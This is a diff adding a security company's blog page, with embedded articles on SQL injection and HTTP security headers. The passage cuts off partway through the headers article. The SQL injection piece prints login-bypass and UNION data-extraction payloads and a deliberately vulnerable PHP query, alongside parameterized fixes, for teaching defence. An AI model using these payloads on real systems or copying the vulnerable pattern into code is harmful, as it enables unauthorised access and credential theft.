@@ -1,0 +1,1726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title id="pageTitle">Article — PenChecker Blog</title>
+<meta name="description" id="pageDesc" content="Security articles, vulnerability guides, and how-to tutorials from the PenChecker team." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet" />
+<style>
+:root {
+  --black:#060608; --black2:#0d0d12; --black3:#13131a;
+  --surface:#1a1a24; --surface2:#22222f;
+  --border:rgba(255,255,255,0.07); --border2:rgba(0,229,255,0.2);
+  --cyan:#00e5ff; --cyan2:#00b4cc; --green:#00ff87;
+  --red:#ff3b5c; --orange:#ff8c42; --yellow:#ffd60a; --purple:#a855f7;
+  --white:#f0f0f8; --muted:#6b6b85; --muted2:#9090a8;
+  --font-display:'Plus Jakarta Sans',sans-serif;
+  --font-body:'Plus Jakarta Sans',sans-serif;
+  --font-mono:'JetBrains Mono',monospace;
+  --radius:12px; --radius2:20px;
+}
+body { transition:background 0.25s,color 0.25s; }
+.light-theme {
+  --black:#f8f9fc; --black2:#e8eaf2; --black3:#ffffff;
+  --surface:#ffffff; --surface2:#f2f4f9;
+  --border:rgba(13,23,44,0.12); --border2:rgba(0,149,212,0.25);
+  --cyan:#007fbc; --cyan2:#005f91; --green:#0f9d58;
+  --red:#d93025; --orange:#e37400; --yellow:#f1c232; --purple:#6a1b9a;
+  --white:#0b0d13; --muted:#4b5d79; --muted2:#6b7790;
+}
+.light-theme #navbar { background:rgba(248,249,252,0.96); backdrop-filter:blur(20px); border-bottom:1px solid var(--border); }
+.light-theme body::before { opacity:0.12; }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--black);color:var(--white);font-family:var(--font-body);font-size:16px;line-height:1.6;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+button{cursor:pointer;font-family:inherit;border:none;outline:none;}
+body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:0.4;}
+::-webkit-scrollbar{width:6px;}::-webkit-scrollbar-track{background:var(--black2);}::-webkit-scrollbar-thumb{background:var(--surface2);border-radius:3px;}::-webkit-scrollbar-thumb:hover{background:var(--cyan2);}
+
+/* Navbar */
+#navbar{position:fixed;top:0;left:0;right:0;z-index:1000;padding:0 24px;transition:all 0.3s ease;}
+#navbar.scrolled{background:rgba(6,6,8,0.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);}
+.nav-inner{max-width:1200px;margin:0 auto;height:70px;display:flex;align-items:center;justify-content:space-between;}
+.nav-logo{display:flex;align-items:center;gap:10px;}
+.nav-logo-icon{width:36px;height:36px;background:var(--cyan);border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-weight:500;font-size:0.85rem;color:var(--black);}
+.nav-logo-text{font-size:1.2rem;font-weight:700;letter-spacing:-0.02em;}
+.nav-logo-text span{color:var(--cyan);}
+.nav-actions{display:flex;align-items:center;gap:10px;}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:10px 20px;border-radius:var(--radius);font-family:var(--font-display);font-weight:600;font-size:0.88rem;transition:all 0.2s;border:none;position:relative;overflow:hidden;}
+.btn::after{content:'';position:absolute;inset:0;background:white;opacity:0;transition:opacity 0.2s;}
+.btn:hover::after{opacity:0.06;}
+.btn-primary{background:var(--cyan);color:var(--black);}
+.btn-ghost{background:transparent;color:var(--white);border:1px solid var(--border);}
+.btn-ghost:hover{border-color:var(--cyan);color:var(--cyan);}
+
+/* Layout */
+.container{max-width:1200px;margin:0 auto;padding:0 24px;}
+.article-layout{display:grid;grid-template-columns:1fr 280px;gap:56px;align-items:start;padding:120px 0 80px;}
+
+/* Article hero */
+.article-hero{margin-bottom:40px;}
+.article-breadcrumb{display:flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:0.72rem;color:var(--muted);margin-bottom:20px;flex-wrap:wrap;}
+.ab-sep{opacity:0.4;}
+.ab-link{color:var(--cyan);cursor:pointer;transition:opacity 0.2s;}
+.ab-link:hover{opacity:0.7;}
+.article-tags{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:16px;}
+.tag{display:inline-flex;align-items:center;gap:5px;padding:4px 11px;border-radius:100px;font-family:var(--font-mono);font-size:0.68rem;font-weight:600;letter-spacing:0.05em;text-transform:uppercase;}
+.tag-cyan{background:rgba(0,229,255,0.1);color:var(--cyan);border:1px solid rgba(0,229,255,0.2);}
+.tag-green{background:rgba(0,255,135,0.1);color:var(--green);border:1px solid rgba(0,255,135,0.2);}
+.tag-red{background:rgba(255,59,92,0.1);color:var(--red);border:1px solid rgba(255,59,92,0.2);}
+.tag-orange{background:rgba(255,140,66,0.1);color:var(--orange);border:1px solid rgba(255,140,66,0.2);}
+.tag-purple{background:rgba(168,85,247,0.1);color:var(--purple);border:1px solid rgba(168,85,247,0.2);}
+.tag-yellow{background:rgba(255,214,10,0.1);color:var(--yellow);border:1px solid rgba(255,214,10,0.2);}
+.article-title{font-size:clamp(1.8rem,4vw,3rem);font-weight:800;letter-spacing:-0.03em;line-height:1.1;margin-bottom:16px;}
+.article-meta{display:flex;align-items:center;gap:16px;flex-wrap:wrap;margin-bottom:24px;}
+.am-author{display:flex;align-items:center;gap:9px;}
+.am-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.75rem;font-weight:700;flex-shrink:0;}
+.am-name{font-size:0.85rem;font-weight:600;}
+.am-role{font-family:var(--font-mono);font-size:0.68rem;color:var(--muted);}
+.am-sep{width:1px;height:20px;background:var(--border);}
+.am-date,.am-read{font-family:var(--font-mono);font-size:0.72rem;color:var(--muted);}
+.article-excerpt{font-size:1.05rem;color:var(--muted2);line-height:1.75;padding:20px 24px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius2);border-left:4px solid var(--cyan);margin-bottom:32px;}
+
+/* Article body */
+.article-body{font-size:0.95rem;line-height:1.85;color:var(--muted2);}
+.article-body h2{font-size:1.35rem;font-weight:700;color:var(--white);margin:36px 0 14px;padding-bottom:12px;border-bottom:1px solid var(--border);letter-spacing:-0.01em;}
+.article-body h3{font-size:1.05rem;font-weight:700;color:var(--white);margin:24px 0 10px;}
+.article-body p{margin-bottom:16px;}
+.article-body p:last-child{margin-bottom:0;}
+.article-body strong{color:var(--white);}
+.article-body a{color:var(--cyan);}
+.article-body a:hover{text-decoration:underline;}
+.article-body ul,.article-body ol{padding-left:22px;margin-bottom:16px;}
+.article-body li{margin-bottom:8px;line-height:1.7;}
+.article-body code{font-family:var(--font-mono);font-size:0.82rem;background:var(--surface);padding:2px 7px;border-radius:5px;color:var(--cyan);}
+.article-body pre{font-family:var(--font-mono);font-size:0.82rem;background:var(--black3);border:1px solid var(--border);border-radius:var(--radius2);padding:20px 22px;margin:18px 0;overflow-x:auto;line-height:1.65;}
+.article-body pre code{background:none;padding:0;color:var(--green);font-size:0.82rem;}
+.article-body pre .comment{color:var(--muted);}
+.article-body pre .keyword{color:var(--cyan);}
+.article-body pre .string{color:var(--orange);}
+.article-body pre .danger{color:var(--red);}
+
+/* Highlight boxes */
+.ab-highlight{border-radius:var(--radius);padding:18px 20px;margin:20px 0;border-left:3px solid;}
+.ab-highlight.warning{background:rgba(255,59,92,0.05);border-color:var(--red);}
+.ab-highlight.tip{background:rgba(0,229,255,0.05);border-color:var(--cyan);}
+.ab-highlight.success{background:rgba(0,255,135,0.05);border-color:var(--green);}
+.ab-highlight.info{background:rgba(255,214,10,0.05);border-color:var(--yellow);}
+.ab-highlight-label{font-family:var(--font-mono);font-size:0.65rem;text-transform:uppercase;letter-spacing:0.1em;font-weight:600;margin-bottom:8px;}
+.ab-highlight.warning .ab-highlight-label{color:var(--red);}
+.ab-highlight.tip .ab-highlight-label{color:var(--cyan);}
+.ab-highlight.success .ab-highlight-label{color:var(--green);}
+.ab-highlight.info .ab-highlight-label{color:var(--yellow);}
+.ab-highlight p{font-size:0.88rem;margin-bottom:0;line-height:1.7;}
+
+/* Scan evidence card */
+.evidence-card{background:var(--black3);border:1px solid var(--border);border-radius:var(--radius2);overflow:hidden;margin:20px 0;}
+.ec-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--surface);border-bottom:1px solid var(--border);}
+.ec-sev{padding:3px 10px;border-radius:5px;font-family:var(--font-mono);font-size:0.65rem;font-weight:700;}
+.ec-sev.critical{background:rgba(255,59,92,0.2);color:var(--red);}
+.ec-sev.high{background:rgba(255,140,66,0.2);color:var(--orange);}
+.ec-sev.medium{background:rgba(255,214,10,0.2);color:var(--yellow);}
+.ec-title{font-size:0.88rem;font-weight:600;}
+.ec-conf{font-family:var(--font-mono);font-size:0.7rem;color:var(--green);}
+.ec-body{padding:16px;}
+.ec-row{margin-bottom:10px;}
+.ec-label{font-family:var(--font-mono);font-size:0.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:5px;}
+.ec-value{font-family:var(--font-mono);font-size:0.78rem;background:var(--surface);padding:8px 12px;border-radius:6px;border-left:2px solid var(--red);color:var(--muted2);line-height:1.5;word-break:break-all;}
+.ec-value.safe{border-left-color:var(--green);color:var(--green);}
+.ec-fix{background:rgba(0,229,255,0.06);border:1px solid rgba(0,229,255,0.15);border-radius:var(--radius);padding:12px;margin-top:10px;}
+.ec-fix-label{font-family:var(--font-mono);font-size:0.65rem;color:var(--cyan);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:6px;}
+.ec-fix p{font-size:0.82rem;color:var(--white);margin:0;}
+
+/* Progress tracker */
+.progress-tracker{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius2);padding:20px;margin:24px 0;}
+.pt-title{font-weight:700;font-size:0.9rem;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
+.pt-steps{display:flex;flex-direction:column;gap:8px;}
+.pt-step{display:flex;align-items:center;gap:10px;font-size:0.82rem;color:var(--muted2);padding:8px 12px;border-radius:8px;background:var(--black3);border:1px solid var(--border);}
+.pt-step.done{color:var(--white);border-color:rgba(0,255,135,0.2);background:rgba(0,255,135,0.04);}
+.pt-step.done::before{content:'';color:var(--green);font-weight:700;flex-shrink:0;}
+.pt-step:not(.done)::before{content:'○';color:var(--muted);flex-shrink:0;}
+
+/* Article footer */
+.article-footer{margin-top:48px;padding-top:28px;border-top:1px solid var(--border);}
+.af-label{font-family:var(--font-mono);font-size:0.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.12em;margin-bottom:16px;}
+.related-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.related-card{background:var(--black3);border:1px solid var(--border);border-radius:var(--radius);padding:16px;cursor:pointer;transition:all 0.2s;}
+.related-card:hover{border-color:var(--border2);transform:translateY(-2px);}
+.rc-tag{font-family:var(--font-mono);font-size:0.62rem;color:var(--cyan);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:6px;}
+.rc-title{font-size:0.85rem;font-weight:600;line-height:1.35;}
+.scan-cta{background:linear-gradient(135deg,rgba(0,229,255,0.07),rgba(0,255,135,0.04));border:1px solid var(--border2);border-radius:var(--radius2);padding:24px;text-align:center;margin-top:28px;}
+.scan-cta h4{font-size:1rem;font-weight:700;margin-bottom:8px;}
+.scan-cta p{font-size:0.82rem;color:var(--muted2);margin-bottom:18px;line-height:1.6;}
+
+/* Sidebar */
+.article-sidebar{position:sticky;top:90px;}
+.sidebar-widget{background:var(--black3);border:1px solid var(--border);border-radius:var(--radius2);padding:20px;margin-bottom:16px;}
+.sw-title{font-weight:700;font-size:0.88rem;margin-bottom:14px;display:flex;align-items:center;gap:7px;}
+.toc-list{display:flex;flex-direction:column;gap:2px;}
+.toc-item{display:block;padding:7px 10px;border-radius:8px;font-size:0.78rem;color:var(--muted2);transition:all 0.2s;border-left:2px solid transparent;cursor:pointer;}
+.toc-item:hover{color:var(--white);background:var(--surface);}
+.toc-item.active{color:var(--cyan);border-left-color:var(--cyan);background:rgba(0,229,255,0.05);}
+.difficulty-badge{display:flex;align-items:center;gap:8px;padding:10px 12px;border-radius:var(--radius);margin-bottom:8px;font-size:0.82rem;}
+.difficulty-badge.easy{background:rgba(0,255,135,0.07);border:1px solid rgba(0,255,135,0.15);color:var(--green);}
+.difficulty-badge.medium{background:rgba(255,214,10,0.07);border:1px solid rgba(255,214,10,0.15);color:var(--yellow);}
+.difficulty-badge.hard{background:rgba(255,59,92,0.07);border:1px solid rgba(255,59,92,0.15);color:var(--red);}
+
+/* Not found state */
+.not-found{text-align:center;padding:120px 24px;max-width:500px;margin:0 auto;}
+.nf-icon{font-size:4rem;margin-bottom:16px;}
+.nf-title{font-size:1.5rem;font-weight:700;margin-bottom:10px;}
+.nf-msg{font-size:0.9rem;color:var(--muted2);line-height:1.7;margin-bottom:24px;}
+
+/* Footer mini */
+footer{background:var(--black);border-top:1px solid var(--border);padding:40px 0 28px;}
+.footer-mini{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;}
+.footer-mini-logo{display:flex;align-items:center;gap:8px;}
+.fml-icon{width:28px;height:28px;background:var(--cyan);border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:0.72rem;color:var(--black);font-weight:500;}
+.fml-text{font-size:1rem;font-weight:700;}
+.fml-text span{color:var(--cyan);}
+.footer-mini-copy{font-family:var(--font-mono);font-size:0.72rem;color:var(--muted);}
+.footer-mini-links{display:flex;gap:16px;}
+.footer-mini-links a{font-size:0.8rem;color:var(--muted);transition:color 0.2s;}
+.footer-mini-links a:hover{color:var(--muted2);}
+
+@media(max-width:900px){.article-layout{grid-template-columns:1fr;padding:100px 0 60px;}.article-sidebar{display:none;}}
+@media(max-width:768px){.nav-actions .btn-ghost{display:none;}.related-grid{grid-template-columns:1fr;}}
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 3px solid rgba(0, 229, 255, 0.1);
+  border-radius: 50%;
+  border-top-color: var(--cyan);
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+</style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">
+      <div class="nav-logo-icon" style="background:none;width:36px;height:36px;display:flex;align-items:center;justify-content:center;padding:0;">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="36" height="36">
+    <defs>
+      <linearGradient id="penchecker-grad-nav" x1="0%" y1="0%" x2="100%" y2="100%">
+        <stop offset="0%" stop-color="#00e5ff" />
+        <stop offset="50%" stop-color="#7c3aed" />
+        <stop offset="100%" stop-color="#00ff87" />
+      </linearGradient>
+      <filter id="penchecker-glow-nav" x="-20%" y="-20%" width="140%" height="140%">
+        <feGaussianBlur stdDeviation="3" result="blur" />
+        <feComposite in="SourceGraphic" in2="blur" operator="over" />
+      </filter>
+    </defs>
+    <path d="M50 12 L82 22 V52 C82 70 68 83 50 88 C32 83 18 70 18 52 V22 Z" fill="none" stroke="url(#penchecker-grad-nav)" stroke-width="3" stroke-linejoin="round" filter="url(#penchecker-glow-nav)" />
+    <path d="M30 40 A 24 24 0 0 1 70 40" fill="none" stroke="#00e5ff" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.8" />
+    <path d="M36 48 A 16 16 0 0 1 64 48" fill="none" stroke="#7c3aed" stroke-width="1.5" stroke-dasharray="2 2" opacity="0.6" />
+    <path d="M50 28 L62 54 L50 72 L38 54 Z" fill="url(#penchecker-grad-nav)" />
+    <line x1="50" y1="38" x2="50" y2="60" stroke="#060608" stroke-width="2" stroke-linecap="round" />
+    <circle cx="50" cy="34" r="2.5" fill="#00ff87" filter="url(#penchecker-glow-nav)" />
+  </svg>
+</div>
+      <div class="nav-logo-text">Pen<span>Checker</span></div>
+    </a>
+    <div class="nav-actions">
+      <button id="themeToggle" class="btn btn-ghost btn-sm" aria-label="Toggle theme" style="padding:8px 14px;font-size:0.82rem;display:inline-flex;align-items:center;gap:6px;"></button>
+      <a href="../blog.html" class="btn btn-ghost">← All Articles</a>
+      <a href="../signup.html" class="btn btn-primary">Start Free</a>
+    </div>
+  </div>
+</nav>
+
+<!-- Article content injected here -->
+<div id="articleRoot">
+  <div class="container">
+    <div class="article-layout">
+      <main id="articleMain">
+        <div class="not-found">
+          <div class="spinner"></div>
+          <div class="nf-title">Loading article...</div>
+          <div class="nf-msg">Please wait while we load this article.</div>
+        </div>
+      </main>
+      <aside class="article-sidebar" id="articleSidebar" style="display:none;"></aside>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="footer-mini">
+      <div class="footer-mini-logo"><div class="fml-icon">PC</div><div class="fml-text">Pen<span>Checker</span></div></div>
+      <div class="footer-mini-copy">© 2025 PenChecker Inc.</div>
+      <div class="footer-mini-links">
+        <a href="../blog.html">Blog</a>
+        <a href="../features.html">Features</a>
+        <a href="../pricing.html">Pricing</a>
+        <a href="../contact.html">Contact</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script>
+'use strict';
+
+// Theme
+const themeToggle = document.getElementById('themeToggle');
+function updateThemeBtn() {
+  if (!themeToggle) return;
+  const isLight = document.body.classList.contains('light-theme');
+  const sunIcon = `<svg class="theme-btn-svg" viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;margin-right:6px;"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>`;
+  const moonIcon = `<svg class="theme-btn-svg" viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>`;
+  themeToggle.innerHTML = (isLight ? sunIcon : moonIcon) + ' ' + (isLight ? 'Light' : 'Dark');
+}
+function setTheme(light){ document.body.classList.toggle('light-theme',light); localStorage.setItem('pencheckerTheme',light?'light':'dark'); updateThemeBtn(); }
+if(themeToggle) themeToggle.addEventListener('click',()=>setTheme(!document.body.classList.contains('light-theme')));
+(function(){ const s=localStorage.getItem('pencheckerTheme'); const p=window.matchMedia('(prefers-color-scheme: light)').matches; setTheme(s==='light'||(!s&&p)); })();
+
+// Navbar scroll
+const navbar = document.getElementById('navbar');
+window.addEventListener('scroll',()=>navbar.classList.toggle('scrolled',window.scrollY>20));
+
+// ============================================================
+// ARTICLE DATABASE — all articles with full content
+// ============================================================
+const ARTICLES = {
+
+  // ─────────────────────────────────────────────
+  // SQL INJECTION
+  // ─────────────────────────────────────────────
+  'sql-injection-guide': {
+    title: 'SQL Injection in 2025: Why It\'s Still the #1 Vulnerability',
+    excerpt: 'SQL injection has been in the OWASP Top 10 for over 15 years. We break down exactly how it works, why scanners keep reporting false positives, and what a real verified injection finding looks like.',
+    tags: [['OWASP A03','tag-red'],['Deep Dive','tag-orange'],['Injection','tag-cyan']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(255,59,92,0.15)', textColor:'var(--red)' },
+    date: 'March 28, 2025', readTime: '12 min read',
+    difficulty: 'intermediate',
+    toc: ['What is SQL Injection?','How it works','Real attack examples','Why scanners lie','PenChecker evidence','Prevention & fix code','Checklist'],
+    relatedSlugs: ['xss-complete-guide','broken-auth-guide','penchecker-tutorial'],
+    content: `
+<h2 id="what-is-sql-injection">What is SQL Injection?</h2>
+<p>SQL Injection (SQLi) is an attack where malicious SQL code is inserted into an input field and executed by the database server. It has consistently ranked as one of the most critical web vulnerabilities since OWASP began tracking it — and for good reason. A successful SQL injection can allow an attacker to read, modify, or delete your entire database.</p>
+<div class="ab-highlight tip"><div class="ab-highlight-label"> Quick Definition</div><p><strong>SQL injection occurs when user-supplied input is included in a SQL query without proper sanitization or parameterization</strong> — causing the database to execute commands the developer never intended.</p></div>
+
+<h2 id="how-it-works">How It Works — Step by Step</h2>
+<p>Imagine a login form that constructs this SQL query:</p>
+<pre><code><span class="comment">-- This is what the developer wrote:</span>
+SELECT * FROM users WHERE email = '<span class="string">[USER_INPUT]</span>' AND password = '<span class="string">[USER_INPUT]</span>';
+
+<span class="comment">-- With normal input:</span>
+SELECT * FROM users WHERE email = '<span class="string">john@example.com</span>' AND password = '<span class="string">mypassword</span>';
+
+<span class="comment">-- With SQL injection payload:</span>
+SELECT * FROM users WHERE email = '<span class="danger">' OR '1'='1' --</span>' AND password = '<span class="string">anything</span>';
+
+<span class="comment">-- Result: The -- comments out the password check.
+-- '1'='1' is always true. The attacker is logged in as the first user.</span></code></pre>
+
+<p>The database does not know the difference between the developer's intended query and the attacker's injected code. They are both just SQL.</p>
+
+<h2 id="real-attack-examples">Real Attack Examples</h2>
+<h3>Classic Login Bypass</h3>
+<pre><code><span class="comment">-- Input in email field:</span>
+<span class="danger">' OR 1=1 --</span>
+
+<span class="comment">-- Input in password field:</span>
+<span class="string">anything</span>
+
+<span class="comment">-- What the server executes:</span>
+SELECT * FROM users WHERE email=<span class="danger">'' OR 1=1 --</span>' AND password='anything'
+<span class="comment">-- Returns ALL users. First row = admin. Attacker is now admin.</span></code></pre>
+
+<h3>Data Extraction (UNION Attack)</h3>
+<pre><code><span class="comment">-- URL parameter: /products?id=1</span>
+<span class="comment">-- Injected:      /products?id=</span><span class="danger">1 UNION SELECT username,password,email FROM users--</span>
+
+<span class="comment">-- Server executes:</span>
+SELECT name,description,price FROM products WHERE id=<span class="danger">1 UNION SELECT username,password,email FROM users--</span>
+<span class="comment">-- Returns all usernames and passwords alongside product data.</span></code></pre>
+
+<h2 id="why-scanners-lie">Why Most Scanners Report False Positives</h2>
+<p>This is the problem PenChecker was built to solve. Here is why most scanners get SQL injection wrong:</p>
+<ul>
+  <li><strong>They run template checks regardless of technology.</strong> A scanner sees a URL parameter and fires a SQL injection payload — even if the site is built with Node.js, uses only an ORM, or has no database at all.</li>
+  <li><strong>They never verify the response.</strong> Most scanners look for generic error patterns like "SQL syntax error" in the response. If nothing obvious appears, they either report a false positive anyway or miss it entirely.</li>
+  <li><strong>They don't fingerprint the stack first.</strong> A PHP/MySQL app and a Node.js/MongoDB app require completely different tests. Running MySQL payloads against a MongoDB app will never work — but template scanners do it anyway.</li>
+</ul>
+
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Real Example</div><p>We tested 6 popular automated scanners against a clean Node.js app with no SQL database. <strong>Five out of six reported SQL injection with CVSS scores between 8.5 and 9.8.</strong> The app had no SQL. The findings were completely fabricated by template scanning.</p></div>
+
+<h2 id="penchecker-evidence">What a Real PenChecker Finding Looks Like</h2>
+<p>PenChecker fingerprints your technology first. If it detects Node.js with Prisma ORM or no SQL database, it skips SQL injection tests entirely for parametrized endpoints. If it does find a PHP/MySQL app with raw query construction, it tests it — and every finding comes with actual server response evidence:</p>
+
+<div class="evidence-card">
+  <div class="ec-header">
+    <div style="display:flex;align-items:center;gap:10px;"><span class="ec-sev critical">CRITICAL</span><span class="ec-title">SQL Injection — Login Endpoint</span></div>
+    <span class="ec-conf">97% confidence</span>
+  </div>
+  <div class="ec-body">
+    <div class="ec-row"><div class="ec-label">Payload Sent</div><div class="ec-value">POST /login — email: ' OR 1=1 --</div></div>
+    <div class="ec-row"><div class="ec-label">Server Response (Evidence)</div><div class="ec-value">HTTP 200 OK — Set-Cookie: session=admin_token_abc123; {"user":{"id":1,"role":"admin","email":"admin@site.com"}} — Login successful without valid credentials</div></div>
+    <div class="ec-row"><div class="ec-label">Affected URL</div><div class="ec-value">https://yoursite.com/api/login — POST parameter: email</div></div>
+    <div class="ec-fix"><div class="ec-fix-label"> Fix — Use Parameterized Queries</div><p>Replace raw query construction with prepared statements. See fix code below.</p></div>
+  </div>
+</div>
+
+<h2 id="prevention-fix-code">Prevention & Fix Code</h2>
+<h3> Vulnerable Code (PHP)</h3>
+<pre><code><span class="comment">// NEVER do this — direct string concatenation</span>
+$query = <span class="danger">"SELECT * FROM users WHERE email = '" . $_POST['email'] . "'"</span>;
+$result = mysqli_query($conn, $query);</code></pre>
+
+<h3> Fixed Code (PHP — Prepared Statements)</h3>
+<pre><code><span class="comment">// CORRECT — parameterized query</span>
+$stmt = $conn-><span class="keyword">prepare</span>(<span class="string">"SELECT * FROM users WHERE email = ?"</span>);
+$stmt-><span class="keyword">bind_param</span>(<span class="string">"s"</span>, $_POST[<span class="string">'email'</span>]);
+$stmt-><span class="keyword">execute</span>();
+$result = $stmt->get_result();</code></pre>
+
+<h3> Fixed Code (Node.js — Prisma ORM)</h3>
+<pre><code><span class="comment">// Prisma uses parameterized queries automatically</span>
+const user = <span class="keyword">await</span> prisma.user.<span class="keyword">findFirst</span>({
+  where: { email: req.body.email } <span class="comment">// Safe — no raw SQL</span>
+});</code></pre>
+
+<h3> Fixed Code (Python — SQLAlchemy)</h3>
+<pre><code><span class="comment"># Use ORM or parameterized queries</span>
+user = session.<span class="keyword">query</span>(User).<span class="keyword">filter</span>(
+  User.email == request.form[<span class="string">'email'</span>]  <span class="comment"># Safe</span>
+).<span class="keyword">first</span>()</code></pre>
+
+<h2 id="checklist">SQL Injection Prevention Checklist</h2>
+<div class="progress-tracker">
+  <div class="pt-title"> Security Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Never concatenate user input into SQL queries</div>
+    <div class="pt-step done">Use parameterized queries or prepared statements for all SQL</div>
+    <div class="pt-step done">Use an ORM (Prisma, Hibernate, SQLAlchemy) where possible</div>
+    <div class="pt-step done">Apply principle of least privilege to database users</div>
+    <div class="pt-step done">Validate and sanitize all user input server-side</div>
+    <div class="pt-step">Run PenChecker scan to verify no raw queries remain</div>
+    <div class="pt-step">Enable database query logging to detect injection attempts</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // HTTP SECURITY HEADERS
+  // ─────────────────────────────────────────────
+  'http-headers-guide': {
+    title: 'The 7 HTTP Security Headers Every Website Must Have in 2025',
+    excerpt: 'Content-Security-Policy, X-Frame-Options, HSTS, and four more. What each one does, how to add it in Nginx, Apache, and Node.js, and how to verify it\'s working.',
+    tags: [['Headers','tag-cyan'],['Beginner','tag-green'],['Quick Win','tag-orange']],
+    author: { initials:'FK', name:'Fatima Koné', role:'CTO & Lead Engineer', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'March 18, 2025', readTime: '8 min read',
+    difficulty: 'easy',
+    toc: ['Why headers matter','1. HSTS','2. Content-Security-Policy','3. X-Frame-Options','4. X-Content-Type-Options','5. Referrer-Policy','6. Permissions-Policy','7. X-XSS-Protection','Adding them all at once'],
+    relatedSlugs: ['ssl-tls-guide','csrf-guide','xss-complete-guide'],
+    content: `
+<h2 id="why-headers-matter">Why HTTP Security Headers Matter</h2>
+<p>HTTP security headers are instructions your server sends to the browser with every response. They cost nothing to add — most take under 2 minutes — and they protect against some of the most common web attacks. PenChecker checks all of these on every scan because missing headers are real, verifiable vulnerabilities.</p>
+<div class="ab-highlight tip"><div class="ab-highlight-label"> The Quick Win</div><p>Adding all 7 headers can <strong>raise your PenChecker security score by 1.5–2 points</strong> and blocks entire categories of attacks at the browser level. It's the fastest improvement you can make.</p></div>
+
+<h2 id="hsts">1. HTTP Strict Transport Security (HSTS)</h2>
+<p><strong>What it does:</strong> Tells browsers to always use HTTPS for your domain, even if the user types <code>http://</code>. Prevents protocol downgrade attacks and SSL stripping.</p>
+<pre><code><span class="comment"># Nginx</span>
+add_header Strict-Transport-Security <span class="string">"max-age=31536000; includeSubDomains; preload"</span> always;
+
+<span class="comment"># Apache</span>
+Header always set Strict-Transport-Security <span class="string">"max-age=31536000; includeSubDomains"</span>
+
+<span class="comment"># Node.js / Express</span>
+res.setHeader(<span class="string">'Strict-Transport-Security'</span>, <span class="string">'max-age=31536000; includeSubDomains'</span>);</code></pre>
+
+<h2 id="content-security-policy">2. Content-Security-Policy (CSP)</h2>
+<p><strong>What it does:</strong> Restricts which scripts, styles, fonts, and resources can load on your pages. This is your primary defence against XSS attacks.</p>
+<pre><code><span class="comment"># Start restrictive — expand as needed</span>
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';</code></pre>
+<div class="ab-highlight info"><div class="ab-highlight-label"> Tip</div><p>Start with <code>Content-Security-Policy-Report-Only</code> header first to monitor violations without breaking anything, then switch to the enforcing <code>Content-Security-Policy</code> once you've reviewed the report.</p></div>
+
+<h2 id="x-frame-options">3. X-Frame-Options</h2>
